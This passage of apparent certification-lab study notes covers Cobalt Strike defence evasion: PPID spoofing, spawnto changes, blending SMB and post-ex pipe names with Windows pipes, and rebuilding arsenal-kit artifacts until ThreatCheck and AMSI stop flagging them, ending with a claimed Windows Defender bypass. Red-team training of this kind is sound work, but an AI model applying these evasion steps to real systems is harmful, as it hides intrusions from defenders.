   ```

   Repeat after every lateral move to a new host.

3. **Set ppid and spawnto per-beacon context** — the profile sets a default, but after lateral
   movement you should set context-appropriate values:

   ```cs
   beacon> process_browser                       // GUI tab — find contextually appropriate parent PID
   beacon> ppid <explorer.exe PID>
   beacon> spawnto x64 %windir%\sysnative\werfault.exe
   ```


### Encounter a detection  🕵️ 
- Use ThreatCheck to identify the flagged bytes/pattern
- Use Ghidra to locate in the compiled artifact
- Modify the source-level code (not the bytes directly) → rebuild

---

## The Named Pipe Question — SMB Listener vs post-ex Pipename

Two completely separate settings are involved:

### 1. SMB Listener pipename (set when creating the listener)

From the Cobalt Strike Primer lab, the SMB listener was created with:
```
Pipename: TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
```

 💡 ** DO NOT use this exact pipename **

`TSVCPIPE-*` is a well-known CS default pattern. Defenders and detection rules flag 🕵️ .
create the SMB listener with a custom unique pipename that blends with legitimate
Windows pipe patterns. Examples of legitimate-looking patterns:

```
# Good — blends with Windows internal pipes:
wkssvc
srvsvc-<random>
netlogon-<random>
ntsvcs-<guid-format>

# Bad — CS defaults, all flagged:
TSVCPIPE-*
msagent_*
postex_*
MSSE-*-server
```

👁️ will need to recreate the SMB listener in the environment. Do NOT copy the lab pipename.

### 2. `post-ex.pipename` in the Malleable C2 profile

```
set pipename "dotnet-diagnostic-#####, ########-####-####-####-############";
```

This controls the named pipe that fork&run (`execute-assembly`, `powerpick`, `mimikatz`, etc.)
uses to receive output from the sacrificial process back to the beacon. This is **not** the same
as the SMB listener pipe.

- The `#####` and `####-####...` patterns are wildcards — CS replaces them with random digits at runtime
- The `dotnet-diagnostic-` prefix blends with .NET CLR diagnostic pipes that exist on any Windows system with .NET installed
- The comma-separated second pattern is a fallback pipe name format

**Summary:**

| Pipe | Controlled by | Lab value | 🕵️ |
|------|--------------|-----------|----------------|
| SMB C2 comms pipe | Listener settings in CS GUI | `TSVCPIPE-4b2f70b3-...` | Custom unique name — NOT TSVCPIPE |
| Fork&run output pipe | `post-ex.pipename` in profile | `dotnet-diagnostic-#####...` | Use lab value — already OPSEC-🟢SAFE |

---

## Methodology - Defence Evasion Stpes

```
1. SSH attacker@10.0.0.5 → cd /opt/cobaltstrike/profiles → nano default.profile
   → Add stage, post-ex, process-inject blocks (copy from cheatsheet)
   → sudo /usr/bin/docker restart cobaltstrike-cs-1
   → sudo /usr/bin/docker logs cobaltstrike-cs-1   (confirm no [!] errors)

2. WSL (Ubuntu) on Windows dev box:
   → cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
   → Edit src-common/patch.c (lines ~45 and ~116 — backward while loops)
   → ./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
   → C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f "C:\tools\...\artifact64big.exe"
   → If detected: fix patch.c → rebuild → ThreatCheck until clean

3. WSL (Ubuntu) on Windows dev box:
   → cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
   → ./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
   → VSCode: fix template.x64.ps1 (line 5 string concat + line 32 WriteProcessMemory)
   → VSCode: replace compress.ps1 content with obfuscated version
   → C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\template.x64.ps1 -e AMSI -t Script   (until clean)

4. CS Script Manager → Load:
   → C:\Tools\cobaltstrike\custom-artifacts\mailslot\artifact.cna
   → C:\Tools\cobaltstrike\custom-resources\resources.cna

5. CS Listeners → Create SMB listener with CUSTOM pipename (not TSVCPIPE-*)

6. Test beacon: Attacks > Scripted Web Delivery → iex on workstation → confirm callback

7. After first beacon checks in:
   # 🧠: driver-bofs\etw.x64.o requires a kernel driver — skip on CRTO I, profile covers AMSI
   beacon> process_browser           # GUI tab — find explorer.exe PID
   beacon> ppid <explorer.exe PID>
   beacon> spawnto x64 %windir%\sysnative\werfault.exe

8. Before any service payload (jump psexec64):
   beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
```

> **You have bypassed Windows Defender by modifying Cobalt Strike's default artifacts, resources,
> and post-exploitation behaviours. Every step above maps to an OPSEC scoring criterion.**
